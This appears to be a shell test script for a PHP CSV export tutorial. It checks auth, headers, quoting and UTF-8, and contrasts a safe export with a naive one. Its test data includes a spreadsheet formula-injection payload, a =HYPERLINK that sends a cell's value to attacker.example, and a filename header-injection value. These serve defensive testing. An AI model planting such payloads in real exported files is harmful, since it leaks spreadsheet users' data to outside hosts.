# project-exporting-data: https://phillipharrington.com/php/projects/exporting-data
ex() { APP_PORT=$PORT docker compose -p "$NAME-export" -f "$ROOT/project-exporting-data/compose.yml" "$@"; }
ex up -d --build --wait >/dev/null 2>&1
for _ in $(seq 1 30); do curl -s -o /dev/null "http://localhost:$PORT/export.php" && break; sleep 0.5; done
U="http://localhost:$PORT"
A='editor:correct horse battery staple'
expect "the export needs a login" "$(curl -si "$U/export.php")" "HTTP/1.1 401"
out="$(curl -si -u "$A" "$U/export.php")"
expect "it's a CSV" "$out" "Content-Type: text/csv; charset=utf-8"
expect "  ...downloaded under our name" "$out" "Content-Disposition: attachment; filename=\"contacts-$(date -u +%Y-%m-%d).csv\""
expect "  ...never cached" "$out" "Cache-Control: private, no-store"
body="$(curl -s -u "$A" "$U/export.php")"
expect "it starts with a byte order mark" "$(printf '%s' "$body" | head -c 3 | od -An -tx1 | tr -d ' ')" "efbbbf"
expect "a comma in a value is quoted" "$body" '"Acme, Inc."'
expect "quotes are doubled" "$body" '"Café ""Kraków"""'
expect "UTF-8 intact" "$body" "Zoë Łukasiewicz"
expect "  ...in any script" "$body" "渡辺 さくら"
expect "a formula becomes text" "$body" "\"'=HYPERLINK(\"\"https://attacker.example/?leak=\"\"&B2,\"\"Click for details\"\")\""
expect "  ...and so does a value starting with +" "$body" "'+1 (555) 0100"
expect "  ...but our own negative number stays a number" "$body" ",-5.00,"
expect "every row has five columns" "$(ex exec -T app php -r '$rows = array_map(fn ($l) => count(str_getcsv($l, ",", "\"", "")), array_filter(explode("\r\n", substr(stream_get_contents(STDIN), 3)))); echo implode(" ", $rows);' <<< "$body")" "5 5 5 5 5 5"
out="$(curl -si -u "$A" "$U/export.php?since=2026-11-15")"
expect "?since filters" "$out" "渡辺 さくら"
if grep -qF "Ann Lee" <<< "$out"; then fail "  ...leaving out earlier rows" "$out"; else pass "  ...leaving out earlier rows"; fi
expect "  ...and goes in the file name" "$out" 'filename="contacts-since-2026-11-15-'
expect "a date that isn't one is a 400" "$(curl -si -u "$A" "$U/export.php?since=2026-02-31")" "HTTP/1.1 400"
expect "  ...and so is anything else" "$(curl -si -u "$A" "$U/export.php?since=%22%3B%20filename%3Devil.exe")" "HTTP/1.1 400"
# Break It: the naive export
naive="$(curl -s "$U/naive-export.php")"
expect "naive: the formula goes out as a formula" "$naive" '=HYPERLINK("https://attacker.example/?leak="&B2'
expect "naive: a comma splits a value in two" "$naive" "Ann Lee,ann@example.com,Acme, Inc.,42"
expect "naive: and the row has the wrong number of columns" "$(ex exec -T app php -r '$rows = array_map(fn ($l) => count(str_getcsv($l, ",", "\"", "")), array_filter(explode("\n", stream_get_contents(STDIN)))); echo implode(" ", $rows);' <<< "$naive")" "4 5 "
ex down -v >/dev/null 2>&1
